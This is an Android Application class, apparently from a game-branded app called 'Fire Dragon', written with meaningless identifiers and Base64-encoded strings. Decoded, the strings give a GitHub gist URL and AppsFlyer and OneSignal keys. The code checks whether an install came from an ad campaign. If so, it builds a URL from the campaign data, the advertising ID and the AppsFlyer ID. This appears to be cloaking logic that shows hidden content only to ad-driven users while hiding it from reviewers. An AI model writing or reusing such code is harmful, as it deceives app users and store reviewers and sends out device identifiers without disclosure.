package com.fire.dragon.thebeststyle228.dsds;

import android.app.Application;
import android.os.Build;

import androidx.annotation.RequiresApi;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.fire.dragon.thebeststyle228.MainActivity;
import com.onesignal.OneSignal;

import java.util.Map;

public class Apppppppp extends Application {

    public static final String fffsd = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzL2M0MmQ2OTIzOGNlOWQzNjdkZGYwOTc4NmQwYTcwNzNkL3Jhdy9GaXJlX0RyYWdvbg==";
    public final String onr = "NDQ2ZjEzMjktNzIzNS00ZTU2LWI2NzgtMTk0YmVhODdkNmQz";
    public final String fhd = "WXk1NUdwbWpQenBqQzI2cmdDcVNZQQ==";


    public static String oindf;
    public static String loiunds = "";
    public static String oiurynd;



    public static String pppppqpqp;
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onCreate() {
        super.onCreate();

        MainActivity.onS(this,onr);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                  oiurynd = MainActivity.aai(Apppppppp.this);
                }catch (Exception e){
                }
            }
        }).start();

        oindf = MainActivity.jf(Apppppppp.this);

        String fh = FD.ddddeee(fhd);
        String jfd = FD.ddddeee("YWZfc3RhdHVz");
        String kfd = FD.ddddeee("Tm9uLW9yZ2FuaWM=");
        String iuot = FD.ddddeee("Y2FtcGFpZ24=");

        AppsFlyerLib.getInstance().init(fh, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> idsl) {

                loiunds = idsl.get(jfd).toString();
                if (loiunds.equals(kfd)){
                    String sssstttrrr =idsl.get(iuot).toString();
                    pppppqpqp = pdpdp(sssstttrrr,getPackageName(), oiurynd, oindf);
                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        },this);
        AppsFlyerLib.getInstance().start(this);

    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String pdpdp(String kfhj, String poiunc, String oufhd, String lfjkdf){

        String jsd;
        String ds;
        String po;
        String qwew;
        String vfc;
        String vcv;
        String loin;

        String[] kkdsh = kfhj.split("::");

        try {
            jsd = kkdsh[0];
        }catch (Exception e){
            jsd = "";
        }
        try {
            ds = kkdsh[1];
        }catch (Exception e){
            ds = "";
        }

        try {
            po = kkdsh[2];
        }catch (Exception e){
            po = "";

        }

        try {
            qwew = kkdsh[3];
        }catch (Exception e){
            qwew = "";
        }

        try {
            vfc = kkdsh[4];
        }catch (Exception e){
            vfc = "";
        }


        try {
            vcv = kkdsh[5];
        }catch (Exception e){
            vcv = "";
        }

        try {
            loin = kkdsh[6];
        }catch (Exception e){
            loin = "";
        }

        OneSignal.sendTag(FD.ddddeee("c3ViX2FwcA=="),ds);

        String khsdh = FD.ddddeee("P2J1bmRsZT0=") + poiunc + FD.ddddeee("JmFkX2lkPQ==") + oufhd + FD.ddddeee("JmFwcHNfaWQ9") + lfjkdf +
                FD.ddddeee("JnN1YjY9") + ds +
                FD.ddddeee("JnN1Yjc9") + po +
                FD.ddddeee("JnN1YjI9") + qwew +
                FD.ddddeee("JnN1YjM9") + vfc +
                FD.ddddeee("JnN1YjQ9") + vcv +
                FD.ddddeee("JnN1YjU9") + loin;

        return  jsd + khsdh;
    }


}
